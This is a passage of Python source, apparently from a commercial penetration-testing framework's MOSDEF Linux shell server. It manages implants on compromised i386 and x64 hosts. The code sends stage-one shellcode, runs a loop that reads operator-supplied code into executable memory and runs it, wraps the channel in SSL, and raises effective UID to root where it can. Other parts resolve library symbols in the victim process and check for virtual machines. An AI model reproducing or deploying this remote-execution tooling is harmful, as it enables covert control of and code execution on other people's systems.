                            exit(1);
                        }

                        left = left - ret;
                        p = p + ret;
                    } while (left > 0);

                } while (connected != 2864434397);
                return;
            }

            // This is the upgraded SSL MOSDEF loop
            while (1) {
                ret  = 0;
                len  = 0;
                left = 4;
                p    = &len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p    = p + ret;
                } while (left > 0);

                m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

                if (m == MAP_FAILED) {
                    exit(1);
                }

                p = m;
                left = len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);

                clearcache(m, m+len);
                callptr(m);
                munmap(m, len);
            }

            exit(0);
        }
        """

        try:
            self.log('Turning on crypto..')
            self.savefunctioncache()
            self.clearfunctioncache()
            request = self.compile(code, vars)
            self.restorefunctioncache()
            self.sendrequest(request)
            self.ssl_ptr = self.readpointer()
            self.leave()
            self.log('SSL pointer: 0x%x' % self.ssl_ptr)
        except ResolveException, ex:
            self.log(str(ex))
            self.log('Aborting crypto setup')
            return False

        return True

#
# was previously 'linuxshellserver'
#
# TODO: follow Linux_ppc example
#

from MOSDEF.linuxremoteresolver import x86linuxremoteresolver
class Linux_i386(LinuxShellServer, x86linuxremoteresolver):
    """
    this is the linux MOSDEF Shell Server class
    """

    def __init__(self,connection,node,logfunction=None, proctype='i386'):
        x86linuxremoteresolver.__init__(self)
        unixshellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        LinuxShellServer.__init__(self)
        MSSgeneric.__init__(self, 'x86')
        self.libraryDict={}
        self.functionDict={}
        self.order=intel_order
        self.unorder=istr2int
        self.perror=linux_perror
        self.node=node
        self.node.shell=self
        self.started = 0

    def xx_writeint(self,word):
        data = intel_order(word)
        self.writebuf(data)

    def setListenPort(self,port):
        self.listenport=port

    def getASMDefines(self):
        return ""

    def assemble(self,code):
        return ""

    def startup(self):
        """
        this function is called by the engine and by self.run()
        we are ready to rock!
        Our stage one shellcode just reads in a word, then reads in that much data
        and executes it
        First we send some shellcode to get the socket register
        Then we send some shellcode to establish our looping server
        """
        if self.started: return 0

        if hasattr(self.connection, "set_timeout"):
            self.connection.set_timeout(30)
        else:
            self.log("Not using timeoutsocket on this node")

        if hasattr(self, 'known_fd'):
            self.fd = self.known_fd
        else:
            sc = shellcodeGenerator.linux_X86()
            sc.addAttr("sendreg",{"fdreg":"ebx","regtosend":"ebx"})
            sc.addAttr("read_and_exec",{"fdreg":"ebx"})
            getfd = sc.get()
            self.log("Sending request of length %d to get FD"%len(getfd))
            self.sendrequest(getfd)

            #now read in our little endian word that is our fd (originally in ebx)
            self.fd = self.readword()
            self.known_fd = self.fd
            self.leave()

        self.log("Self.fd = %d" % self.fd)
        self.set_fd(self.fd)

        # XXX: do these three lines need to be in a mutex?
        self.libc.initStaticFunctions({'fd': self.fd})
        # XXX: because we operate on a copy of the libc localfunctions inside remote resolver
        # XXX: we must now update the remote resolver copy of the localfunctions with a new copy
        self.localfunctions = copy.deepcopy(self.libc.localfunctions)
        self.initLocalFunctions()

        sc = shellcodeGenerator.linux_X86()
        sc.addAttr("Normalize Stack", [500])
        sc.addAttr("read_and_exec_loop", {"fd" : self.fd})
        mainloop = sc.get()
        self.sendrequest(mainloop)
        self.leave()

        # Try and upgrade to SSL
        if not isinstance(self.connection, MOSDEFSock) and CanvasConfig['ssl_mosdef'] and self.do_ssl():
            old_connection = self.connection
            self.connection = ssl.wrap_socket(self.connection._sock, server_side=True,
                                              certfile=os.path.join(RESOURCE, 'mosdefcert.pem'),
                                              do_handshake_on_connect=False,
                                              ssl_version=ssl.PROTOCOL_SSLv3)
            try:
                self.log('SSL handshake..')
                self.connection.settimeout(20)
                self.connection.do_handshake()
                self.log('Encrypted loop established')

                # Replace write with SSL-enabled write
                self.localfunctions["write"] = ("c", """
                #import "remote", "libssl.so|SSL_write" as "SSL_write"
                #import "local",  "syscall3" as "syscall3"

                int write(int fd, char *buf, int nbytes)
                {

                    int retval;

                    if (fd == FD) {
                        retval = SSL_write(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_write, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Replace read with SSL-enabled read
                self.localfunctions["read"] = ("c", """
                #import "remote", "libssl.so|SSL_read" as "SSL_read"
                #import "local", "syscall3" as "syscall3"

                int read(int fd, char *buf, int nbytes)
                {
                    int retval;

                    if (fd == FD) {
                        retval = SSL_read(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_read, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Monkey patch the new SSL connection instance to add set_timeout method
                # that will simply call the python socket timeout method
                self.connection.set_timeout = types.MethodType(lambda s, t: s.settimeout(t), self.connection)

            except ssl.SSLError, ex:
                self.log(str(ex))
                self.log('Handshake failed, aborting crypto setup')
                self.log('Attempt to synchronize connection..')
                self.connection = old_connection

                buf   = []

                while True:
                    byte = self.connection.recv(1)

                    if not byte:
                        # Connection closed
                        self.log('Connection closed, aborting ShellServer startup')
                        return 0

                    buf.append(byte)

                    if ''.join(buf[-4:]) == '\xdd\xcc\xbb\xaa':
                        # We have our trigger
                        self.log('Re-synchronized connection, continuing with normal MOSDEF')
                        # Send trigger to remote end
                        self.connection.sendall('\xdd\xcc\xbb\xaa')
                        break


        self.log("Set up Linux dynamic linking assembly component server")
        self.log("Initialized Local Functions.")
        self.log("Resetting signal handlers...")
        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')
        self.log("Reset SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)
        self.log("Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)

        self.log("Getting UIDs");
        (uid,euid,gid,egid) = self.ids()
        self.uid = uid # so we get a nice little '#' prompt from NodePrompt on uid 0

        if euid !=0 and uid == 0:
            self.log("Setting euid to 0...")
            self.seteuid(0)

        # here we set the timout to None, since we know the thing works...(I hope)
        # timeout to 60 ... we should be okay now
        self.connection.set_timeout(None)
        self.setInfo("Linux MOSDEF ShellServer. Remote host: %s"%("*"+str(self.getRemoteHost())+"*"))
        self.setProgress(100)
        self.started = 1
        return self.started


    def do_ssl(self, timeout=10):
        """
        Try and upgrade the existing TCP MOSDEF connection to an encrypted SSL.

        There is some trickery involved here, mainly to do with the fact that
        SSL_connect can block for ever (even on errors), so we need to do everything
        in non-blocking mode, measure elapsed time and bail out if it gets to be
        too long.

        TIMEOUT is maximum time in seconds that we will spend in the SSL handshake.
        """

        vars = self.libc.getdefines()

        vars['FD']      = self.fd
        vars['TIMEOUT'] = timeout

        code = """
        #import "remote", "libssl.so|SSL_library_init"       as "SSL_library_init"
        #import "remote", "libssl.so|SSL_CTX_new"            as "SSL_CTX_new"
        #import "remote", "libssl.so|SSLv3_method"           as "SSLv3_method"
        #import "remote", "libssl.so|SSL_new"                as "SSL_new"
        #import "remote", "libssl.so|SSL_set_fd"             as "SSL_set_fd"
        #import "remote", "libssl.so|SSL_connect"            as "SSL_connect"
        #import "remote", "libssl.so|SSL_read"               as "SSL_read"
        #import "remote", "libssl.so|SSL_write"              as "SSL_write"
        #import "remote", "libssl.so|SSL_get_error"          as "SSL_get_error"

        #import "remote",  "select"                          as "select"

        #import "local",  "read"        as "read"
        #import "local",  "fcntl"       as "fcntl"
        #import "local",  "sendint"     as "sendint"
        #import "local",  "sendpointer" as "sendpointer"
        #import "local",  "munmap"      as "munmap"
        #import "local",  "mmap"        as "mmap"
        #import "local",  "exit"        as "exit"
        #import "local",  "callptr"     as "callptr"
        #import "local",  "debug"       as "debug"

        #import "int",    "FD"          as "FD"
        #import "int",    "F_SETFL"     as "F_SETFL"
        #import "int",    "F_GETFL"     as "F_GETFL"
        #import "int",    "O_NONBLOCK"  as "O_NONBLOCK"
        #import "int",    "O_BLOCK"     as "O_BLOCK"

        #import "int",    "PROT_READ"   as "PROT_READ"
        #import "int",    "PROT_WRITE"  as "PROT_WRITE"
        #import "int",    "PROT_EXEC"   as "PROT_EXEC"
        #import "int",    "MAP_PRIVATE" as "MAP_PRIVATE"
        #import "int",    "MAP_ANON"    as "MAP_ANON"
        #import "int",    "MAP_FAILED"  as "MAP_FAILED"

        struct timeval {
            int sec;
            int usec;
        };

        void main()
        {
            void *m;
            void *ctx;
            void *ssl;
            void *method;
            char *p;

            int ret;
            int len;
            int left;

            int timeout;
            int connected;
            int opts;

            struct timeval tv;


            SSL_library_init();
            method = SSLv3_method();

            ctx = SSL_CTX_new(method);
            ssl = SSL_new(ctx);

            sendpointer(ssl);
            SSL_set_fd(ssl, FD);

            // Turn on non-blocking mode since SSL_connect can block forever
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts | O_NONBLOCK;
            fcntl(FD, F_SETFL, opts);

            timeout   = 0;
            connected = 0;

            do {
                tv.sec  = 1;
                tv.usec = 0;

                ret = SSL_connect(ssl);

                if (ret == 1) {
                    connected = 1;
                } else {
                    ret = select(NULL, NULL, NULL, NULL, &tv);
                    timeout = timeout + 1;

                    if (ret == -1) {
                        connected = 2;
                    }

                    if (timeout == TIMEOUT) {
                        connected = 2;
                    }
                }
            } while (connected == 0);


            // Turn off non-blocking mode
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts & O_BLOCK;
            fcntl(FD, F_SETFL, opts);

            if (connected != 1) {
                // Handshake error, need to resynchronize
                // if we want to keep connection/mosdef loop going
                sendint(2864434397);

                do {
                    p = &connected;
                    left = 4;
                    do {
                        ret = read(FD, p, left);

                        if (ret < 0) {
                            exit(1);
                        }

                        left = left - ret;
                        p = p + ret;
                    } while (left > 0);

                } while (connected != 2864434397);
                return;
            }

            // This is the upgraded SSL MOSDEF loop
            while (1) {
                ret  = 0;
                len  = 0;
                left = 4;
                p    = &len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p    = p + ret;
                } while (left > 0);

                m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);

                if (m == MAP_FAILED) {
                    exit(1);
                }

                p = m;
                left = len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);

                callptr(m);
                munmap(m, len);
            }

            exit(0);
        }
        """

        try:
            self.log('Turning on crypto..')
            self.savefunctioncache()
            self.clearfunctioncache()
            request = self.compile(code, vars)
            self.restorefunctioncache()
            self.sendrequest(request)

            self.ssl_ptr = self.readpointer()

            self.leave()
            self.log('SSL pointer: 0x%x' % self.ssl_ptr)
        except ResolveException, ex:
            self.log(str(ex))
            self.log('Aborting crypto setup')
            return False

        return True


    def stat(self, filename):
        return self.__xstat(filename, mode='stat')

    def fstat(self, fd):
        return self.__xstat(fd, mode="fstat")

    def statfs(self, path):
        vars = { 'path' : path }
        code = """
        #include <sys/statfs.h>
        #import "local","sendint" as "sendint"
        #import "string","path" as "path"

        void main(void)
        {
                struct statfs st;
                int ret;

                ret = statfs(path, &st);
                sendint(ret);

                if (ret == 0) {
                    sendint(st.f_type);
                    sendint(st.f_bsize);
                    sendint(st.f_blocks);
                    sendint(st.f_bfree);
                    sendint(st.f_bavail);
                    sendint(st.f_files);
                    sendint(st.f_ffree);
                    sendint(st.f_fsid0);
                    sendint(st.f_fsid1);
                    sendint(st.f_namelen);
                    sendint(st.f_frsize);
                }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed = True)

        if ret == 0:
            st = self.readstruct([   ("l","f_type"),
                                     ("l","f_bsize"),
                                     ("l","f_blocks"),
                                     ("l","f_bfree"),
                                     ("l","f_bavail"),
                                     ("l","f_files"),
                                     ("l","f_ffree")])

            # Represent f_fsid as a tuple.  We cannot do this through
            # readstruct so for now do it by hand.
            fsid0 = self.readint()
            fsid1 = self.readint()
            st["f_fsid"] = (fsid0, fsid1)
            st["f_namelen"] = self.readint()
            st["f_frsize"] = self.readint()

        self.leave()

        if ret < 0:
            raise MSSError(-ret, "statfs", os.strerror(-ret))

        return st

    def __statvfs_getflags(self, fstype, path_stat):
        # XXX: this should move to more appropriate location.
        fs_types = {
            'EXT2_SUPER_MAGIC'      : 0xef53,
            'DEVPTS_SUPER_MAGIC'    : 0x1cd1,
            'SHMFS_SUPER_MAGIC'     : 0x01021994,
            'PROC_SUPER_MAGIC'      : 0x9fa0,
            'USBDEVFS_SUPER_MAGIC'  : 0x9fa2,
            'AUTOFS_SUPER_MAGIC'    : 0x187,
            'NFS_SUPER_MAGIC'       : 0x6969,
            'SYSFS_MAGIC'           : 0x62656572,
            'REISERFS_SUPER_MAGIC'  : 0x52654973,
            'XFS_SUPER_MAGIC'       : 0x58465342,
            'JFS_SUPER_MAGIC'       : 0x3153464a,
            'HPFS_SUPER_MAGIC'      : 0xf995e849,
            'DEVFS_SUPER_MAGIC'     : 0x1373,
            'ISOFS_SUPER_MAGIC'     : 0x9660,
            'MSDOS_SUPER_MAGIC'     : 0x4d44,
            'NTFS_SUPER_MAGIC'      : 0x5346544e,
            'LOGFS_MAGIC_U32'       : 0xc97e8168
        }

        fs_names = {
            fs_types['EXT2_SUPER_MAGIC']        : ('ext2', 'ext3', 'ext4'),
            fs_types['DEVPTS_SUPER_MAGIC']      : 'devpts',
            fs_types['SHMFS_SUPER_MAGIC']       : 'tmpfs',
            fs_types['PROC_SUPER_MAGIC']        : 'proc',
            fs_types['USBDEVFS_SUPER_MAGIC']    : 'usbdevfs',
            fs_types['AUTOFS_SUPER_MAGIC']      : 'autofs',
            fs_types['NFS_SUPER_MAGIC']         : 'nfs',
            fs_types['SYSFS_MAGIC']             : 'sysfs',
            fs_types['REISERFS_SUPER_MAGIC']    : 'reiserfs',
            fs_types['XFS_SUPER_MAGIC']         : 'xfs',
            fs_types['JFS_SUPER_MAGIC']         : 'jfs',
            fs_types['HPFS_SUPER_MAGIC']        : 'hpfs',
            fs_types['DEVFS_SUPER_MAGIC']       : 'devfs',
            fs_types['ISOFS_SUPER_MAGIC']       : 'iso9660',
            fs_types['MSDOS_SUPER_MAGIC']       : 'msdos',
            fs_types['NTFS_SUPER_MAGIC']        : 'ntfs',
            fs_types['LOGFS_MAGIC_U32']         : 'logfs'
        }

        # Maps option names to flag values
        fs_options = {
            'ro'            : self.libc.getdefine('ST_RDONLY'),
            'nosuid'        : self.libc.getdefine('ST_NOSUID'),
            'noexec'        : self.libc.getdefine('ST_NOEXEC'),
            'nodev'         : self.libc.getdefine('ST_NODEV'),
            'sync'          : self.libc.getdefine('ST_SYNCHRONOUS'),
            'mand'          : self.libc.getdefine('ST_MANDLOCK'),
            'noatime'       : self.libc.getdefine('ST_NOATIME'),
            'nodiratime'    : self.libc.getdefine('ST_NODIRATIME'),
            'relatime'      : self.libc.getdefine('ST_RELATIME'),
        }

        # Track whether we encountered an error along the way.
        error = 0

        # Open the mounts database, we want to try /etc/mtab on failure.
        try:
            fd = self.setmntent("/proc/mounts", "r")
        except:
            # The exception this can raise will be passed on to the caller.
            fd = self.setmntent("/etc/mtab", "r")

        while True:
            # Translate an EOF event into an ENOENT error, as we failed
            # to find the right mount entry.
            try:
                entry = self.getmntent(fd)
            except:
                self.endmntent(fd)
                raise MSSError(errno.ENOENT, "statvfs", os.strerror(errno.ENOENT))

            # We want filesystems of the same type, prefilter so we do not
            # make excessive stat() calls.
            if fs_names.has_key(fstype) and \
               entry['mnt_type'] not in fs_names[fstype]:
                continue

            # Stat the mount directory.  In case of failure, do try to
            # continue with the rest of the mounts entries.
            ret, mount_stat = self.stat(entry['mnt_dir'])
            if ret < 0:
                error = ret
                continue

            # We need the mount point to be the same device as the pathname
            # passed to statvfs()
            if mount_stat['st_dev'] != path_stat['st_dev']:
                continue

            # We found the right device, now fill in the options.
            flags = 0
            # We pretend we didn't see an error because even though a stat()
            # failed, we have the result we wanted.
            error = 0

            for option in entry['mnt_opts'].split(','):
                if not fs_options.has_key(option):
                    continue

                flags = flags | fs_options[option]

            # And we're done with the loop, so bail out.
            break

        # We're done with the mounts
        self.endmntent(fd)

        # We're done, but if we have no result and had an error, we
        # signal this was the case.  We don't care for these exceptions
        # as long as we had a result: a stat() on a mount entry we did
        # not need is culprit.
        if error < 0:
            raise MSSError(-error, "statvfs", os.strerror(-error))

        return flags

    def statvfs(self, path):
        # Raises MSSError on failure.
        fs_stat = self.statfs(path)
        ret, stat = self.stat(path)

        # If we fail to stat path, we cannot reliably determine f_flags.
        # glibc choses to set f_flags to 0 in this case and does not error.
        # We however make this scenario a hard failure, as we need to know
        # whether f_flags can be relied on or not.
        if ret < 0:
            raise MSSError(-ret, "statvfs", os.strerror(-ret))

        # Handle shared key/value pairs first.
        keys = ["f_bsize", "f_blocks", "f_bfree", "f_bavail", "f_files",
                "f_ffree"];
        vfs_stat = dict([[key, fs_stat[key]] for key in keys])

        # Map the statfs dictionary on the statvfs one.  This can raise an
        # exception on failure, which we want to propagate.
        vfs_stat["f_flag"] = self.__statvfs_getflags(fs_stat['f_type'] ,stat)

        # Older kernels did not supply f_frsize
        if fs_stat["f_frsize"] == 0:
            vfs_stat["f_frsize"] = fs_stat["f_bsize"]
        else:
            vfs_stat["f_frsize"] = fs_stat["f_frsize"]

        # Due to different types for f_fsid we may face a size reduction
        # here when dealing with the C api.  This being as it may, we chose
        # not to do this in our python wrapper, and provide the full 64-bit
        # value of f_fsid.
        fsid0, fsid1 = fs_stat["f_fsid"]
        vfs_stat["f_fsid"] = fsid1 << 32 | fsid0
        vfs_stat["f_namemax"] = fs_stat["f_namelen"]

        # XXX: taken from glibc, which does it wrong.
        vfs_stat["f_favail"] = fs_stat["f_ffree"]

        return vfs_stat

    def __xstat(self, arg, mode = "fstat"):
        """
        runs [f]stat
        """

        vars={}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode
        vars[d[2]] = arg

        code="""
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","%s" as "%s"
        #import "%s", "%s" as "%s"
        void main()
        {
             struct stat buf;
             int ret;

             ret=%s(%s,&buf);
             sendint(ret);
             if (ret==0) {
              //success
              sendshort(buf.st_dev);
              sendint(buf.st_ino);
              sendshort(buf.st_mode);
              sendshort(buf.st_nlink);
              sendshort(buf.st_uid);
              sendshort(buf.st_gid);
              sendshort(buf.st_rdev);
              sendint(buf.st_size);
              sendint(buf.st_blksize);
              sendint(buf.st_blocks);
              sendint(buf.st_atime);
              sendint(buf.st_mtime);
              sendint(buf.st_ctime);
              }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        statbuf=None
        if ret==0:
            #success
            statbuf=self.readstruct([("s","st_dev"),
                                     ("l","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("s","st_uid"),
                                     ("s","st_gid"),
                                     ("s","st_rdev"),
                                     ("l","st_size"),
                                     ("l","st_blksize"),
                                     ("l","st_blocks"),
                                     ("l","st_atime"),
                                     ("l","st_mtime"),
                                     ("l","st_ctime")])

         #print "Ret=%s"%ret
        self.leave()
        return ret,statbuf

    #### i386 Shellcode functions below ####

    # XXX: this is i386 specific ! keep it here ;)
    def checkvm(self):
        "Checks if we're inside a VM by checking for a relocated idt"
        logging.warning("Checking if we're inside a VirtualMachine")
        vars = {}
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "checkvm" as "checkvm"

        void
        main()
        {
            int i;
            i = checkvm();
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        devlog("checkvm", "checkvm sent back a %d"%ret)

        # Decide what to do based on the value returned
        vm_values = [0xd0, 0xff, 0xe8, 128]

        if ret in vm_values:
            self.log("[!] Looks like we're on virtual hardware :)")
        else:
            ret = 0
            self.log("[!] Looks like we're on real hardware :)")

        self.leave()
        return ret

    #### dependent on local var functions ###

    def shutdown(self):
        """
        close the socket
        """
        self.connection.close()
        return

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        print "[+] Receiving %d bytes from fd %d" % (length,fd)
        message = self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength = 0
        ret = []
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        self.leave()
        return buffer


    def clearfunctioncache(self):
        self.remoteFunctionsUsed = {}
        x86linuxremoteresolver.clearfunctioncache(self)
        return

    def readpointer(self):
        return self.readint()


from MOSDEF.linuxremoteresolver import x64linuxremoteresolver
class Linux_x64(LinuxShellServer, x64linuxremoteresolver):
    COMPILE_ARCH = 'X64'

    def __init__(self, connection, node, logfunction=None, proctype='x64'):
        self.LP64       = True
        x64linuxremoteresolver.__init__(self)
        LinuxShellServer.__init__(self)
        unixshellserver.__init__(self, connection, type='Active', logfunction=logfunction)
        MSSgeneric.__init__(self, proctype)

        self.order      = intel_order
        self.node       = node
        self.node.shell = self
        self.started    = 0

    def get_libc_libdl_base(self):
        mappings = self.read_proc_file("/proc/self/maps")

        libc_base  = 0
        libdl_base = 0
        if mappings is not None:
            for line in iter(mappings.splitlines()):
                if not libc_base  and "libc" in line:
                    m = re.match(r'([0-9A-Fa-f]+).*', line)
                    libc_base = int(m.group(1), 16)
                    # print "Found libc base: 0x%x" % libc_base

                if not libdl_base and "libdl" in line:
                    m = re.match(r'([0-9A-Fa-f]+).*', line)
                    libdl_base = int(m.group(1), 16)
                    # print "Found libdl base: 0x%x" % libdl_base

                if libc_base and libdl_base:
                    break

        return libc_base, libdl_base

    def resolve_libc_dlopen(self, libc_base):
        if not libc_base:
            self.log("[EE] libc base is NULL")
            return

        ptr = self.getprocaddress_primitive(libc_base, "__libc_dlopen_mode")
        if (ptr):
            self.remotefunctioncache['__libc_dlopen_mode'] = ptr
            # logging.info("Found __libc_dlopen_mode @ 0x%x" % self.remotefunctioncache['__libc_dlopen_mode'])
        else:
          logging.critical("__lib_dlopen_mode not found")

    def load_libdl(self):
        vars = {}
        vars['lib'] = "libdl.so.2"

        code = """
        #import "local", "sendpointer"           as "sendpointer"
        #import "remote64", "__libc_dlopen_mode" as "__libc_dlopen_mode"

        #import "string", "lib"                  as "lib"

        void main()
        {
            long long **ptr;
            ptr = __libc_dlopen_mode(lib, 0x00100 | 0x1);
            if (ptr) {
                sendpointer(*ptr);
            }
            else {
                sendpointer(0);
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        libdl_base = uint64(self.readpointer())
        self.leave()

        return libdl_base

    def init_resolution(self):
        libc_base, libdl_base = self.get_libc_libdl_base()
        # self.log("libc_base : 0x%x" % libc_base)
        # self.log("libdl_base: 0x%x" % libdl_base)

        if (libc_base):
            self.resolve_libc_dlopen(libc_base)

        if not libdl_base and "__libc_dlopen_mode" in self.remotefunctioncache:
            libdl_base = self.load_libdl()

        if (libdl_base):
            # self.log("Mapped libdl @ 0x%x" % libdl_base)
            _dlopen = self.getprocaddress_primitive(libdl_base, "dlopen")
            _dlsym  = self.getprocaddress_primitive(libdl_base, "dlsym")

            if (_dlopen and _dlopen != libdl_base):
                self.remotefunctioncache['_dlopen'] = _dlopen
                # self.log("Found dlopen @ 0x%x" % self.remotefunctioncache['_dlopen'])
            if (_dlsym and _dlsym != libdl_base):
                self.remotefunctioncache['_dlsym']  = _dlsym
                # self.log("Found dlsym @ 0x%x" % self.remotefunctioncache['_dlsym'])

            if ('_dlopen' in self.remotefunctioncache and '_dlsym' in self.remotefunctioncache):
                self.log("[+] All requirements satisfied, enabling x64 Linux remote resolver")
                self.remote_resolver = True
            else:
                self.log("[EE] x64 Linux remote resolver setup failed")


    def startup(self):
        if self.started == True:
            return 0

        devlog('shellserver', 'linux shellserver starting up ..')
        devlog('shellserver', 'local: %s, remote: %s' % \
               (self.connection.getsockname(), self.connection.getpeername()))

        # Stage 1 emulation, 4 byte length + 1 byte 'data' that won't be executed
        self.connection.send('\x01\x00\x00\x00\x00')

        import struct
        self.fd = struct.unpack('<L', self.connection.recv(4))[0]

        self.set_fd(self.fd)
        self.libc.initStaticFunctions({'fd': self.fd}) # update libc functions that require fd val
        self.localfunctions = copy.deepcopy(self.libc.localfunctions) # update our rr copy of the libc
        self.initLocalFunctions()

        devlog('shellserver::startup', 'remote fd: %d' % self.fd)

        self.setInfo('[+] Linux_x64 ShellServer started on: %s (remote fd: %d)' % (self.connection.getpeername(), self.fd))
        self.started = True

        self.init_resolution()

        # Try and upgrade to SSL
        if not isinstance(self.connection, MOSDEFSock) and CanvasConfig['ssl_mosdef'] and self.do_ssl():
            old_connection = self.connection
            self.connection = ssl.wrap_socket(self.connection._sock, server_side=True,
                                              certfile=os.path.join(RESOURCE, 'mosdefcert.pem'),
                                              do_handshake_on_connect=False,
                                              ssl_version=ssl.PROTOCOL_SSLv3)
            try:
                self.log('[+] SSL handshake..')
                self.connection.settimeout(20)
                self.connection.do_handshake()
                self.log('[+] Encrypted loop established')

                # Replace write with SSL-enabled write
                self.localfunctions["write"] = ("c", """
                #import "remote", "libssl.so|SSL_write" as "SSL_write"
                #import "local",  "syscall3" as "syscall3"

                int write(int fd, char *buf, int nbytes)
                {

                    int retval;

                    if (fd == FD) {
                        retval = SSL_write(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_write, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Replace read with SSL-enabled read
                self.localfunctions["read"] = ("c", """
                #import "remote", "libssl.so|SSL_read" as "SSL_read"
                #import "local", "syscall3" as "syscall3"

                int read(int fd, char *buf, int nbytes)
                {
                    int retval;

                    if (fd == FD) {
                        retval = SSL_read(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_read, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Monkey patch the new SSL connection instance to add set_timeout method
                # that will simply call the python socket timeout method
                self.connection.set_timeout = types.MethodType(lambda s, t: s.settimeout(t), self.connection)

            except ssl.SSLError, ex:
                self.log(str(ex))
                self.log('[EE] Handshake failed, aborting crypto setup')
                self.log('[+] Attempt to synchronize connection..')
                self.connection = old_connection

                buf   = []

                while True:
                    byte = self.connection.recv(1)

                    if not byte:
                        # Connection closed
                        self.log('[+] Connection closed, aborting ShellServer startup')
                        return 0

                    buf.append(byte)

                    if ''.join(buf[-4:]) == '\xdd\xcc\xbb\xaa':
                        # We have our trigger
                        self.log('[+] Re-synchronized connection, continuing with normal MOSDEF')
                        # Send trigger to remote end
                        self.connection.sendall('\xdd\xcc\xbb\xaa')
                        break

        return self.started

    def getprocaddress_primitive(self, base, symbol):
        vars = {}
        vars["base"]    = base
        vars["symbol"]  = symbol
        code = """
        #import "local", "sendpointer" as "sendpointer"
        #import "local", "resolve"     as "resolve"

        #import "long long", "base"            as "base"
        #import "string",    "symbol"          as "symbol"

        void main()
        {
            long long ptr;
            ptr = resolve(base, symbol);
            sendpointer(ptr);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = uint64(self.readpointer())
        self.leave()
        return ret

    def read_proc_file(self, proc_file):
        vars          = {}
        vars["path"]  = proc_file

        code = """
        #import "local",  "open"    as "open"
        #import "local",  "sendint" as "sendint"
        #import "string", "path"    as "path"

        void main()
        {
            int fd;
            fd = open(path, O_RDONLY);
            sendint(fd);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.leave()

        maps_fd = self.readint(signed=True)
        if maps_fd == -1:
          return None

        mappings = ""
        while True:
            line = self.file_readline(maps_fd)
            if not line:
              break
            mappings += line

        vars = {}
        vars["fd"] = maps_fd
        code = """
        #import "local", "close"   as "close"
        #import "int",   "fd"      as "fd"

        void main()
        {
            close(fd);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.leave()

        return mappings

    def do_ssl(self, timeout=10):
        """
        Try and upgrade the existing TCP MOSDEF connection to an encrypted SSL.

        There is some trickery involved here, mainly to do with the fact that
        SSL_connect can block for ever (even on errors), so we need to do everything
        in non-blocking mode, measure elapsed time and bail out if it gets to be
        too long.

        TIMEOUT is maximum time in seconds that we will spend in the SSL handshake.
        """

        vars = self.libc.getdefines()

        vars['FD']      = self.fd
        vars['TIMEOUT'] = timeout

        code = """
        #import "remote", "libssl.so|SSL_library_init"       as "SSL_library_init"
        #import "remote", "libssl.so|SSL_CTX_new"            as "SSL_CTX_new"
        #import "remote", "libssl.so|SSLv3_method"           as "SSLv3_method"
        #import "remote", "libssl.so|SSL_new"                as "SSL_new"
        #import "remote", "libssl.so|SSL_set_fd"             as "SSL_set_fd"
        #import "remote", "libssl.so|SSL_connect"            as "SSL_connect"
        #import "remote", "libssl.so|SSL_read"               as "SSL_read"
        #import "remote", "libssl.so|SSL_write"              as "SSL_write"
        #import "remote", "libssl.so|SSL_get_error"          as "SSL_get_error"

        #import "remote",  "select"                          as "select"

        #import "local",  "read"        as "read"
